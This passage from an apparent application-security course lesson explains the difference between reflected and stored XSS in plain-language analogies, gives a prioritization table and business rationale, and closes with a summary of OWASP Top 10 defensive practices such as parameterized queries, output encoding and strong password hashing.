"Imagine someone sends a trick link to one of our customers. When they click it, our website accidentally runs the attacker's code in their browser. The attacker has to trick each victim individually - like sending phishing emails one by one."

**Stored XSS (like poisoning the water supply):**
"Imagine an attacker posts a malicious comment on our website. Now every customer who views that comment gets attacked automatically. One attack affects thousands of users - like poisoning a public water fountain."

**Prioritization: Stored XSS first**

| Factor | Reflected | Stored |
|--------|-----------|--------|
| Attack scale | One victim per attack | All viewers affected |
| Attacker effort | Must phish each victim | One-time payload |
| Persistence | Requires active phishing | Always present |
| Detection | Harder (unique URLs) | Easier (in database) |
| Impact severity | High | Critical |

**Business justification:**
- Stored XSS on a popular page could affect 100% of our users
- Single stored XSS = potential mass breach
- Reflected XSS requires social engineering for each victim
- Regulatory impact: stored XSS incident affects more users = larger notification scope

**Recommendation:**
Fix all XSS, but prioritize stored XSS as critical/P1, reflected XSS as high/P2.

</details>

---

## Summary

The OWASP Top 10 represents real-world application security risks:

### Injection (A03)
- Never concatenate user input into queries
- Use **parameterized queries** or **ORMs** correctly
- Apply **input validation** as defense in depth

### Access Control (A01)
- Check authorization on **every request**
- Use **indirect references** where possible
- Implement **audit logging** for sensitive access

### XSS (Part of A03)
- Apply **context-aware output encoding**
- Implement **Content Security Policy**
- Use **HTTPOnly** cookies to limit impact

### Authentication (A07)
- Use **strong password hashing** (Argon2, bcrypt)
- Implement **rate limiting** and **account lockout**
- Support **MFA** for sensitive accounts

### Cryptographic Failures (A02)
- Use **modern algorithms** (AES-256, RSA-2048+)
- Implement **proper key management**
- Enforce **TLS 1.2+** everywhere

### Key Points
- Understand **attack mechanics**, not just prevention
- Know the difference between **design flaws** and **implementation bugs**
- Be able to explain risks to **technical and non-technical** audiences
- Prioritize based on **actual risk**, not just severity scores

---

## Next Up

**Module 6, Lesson 3: API Security Architecture** - Securing REST and GraphQL APIs, authentication patterns, and API gateway design.
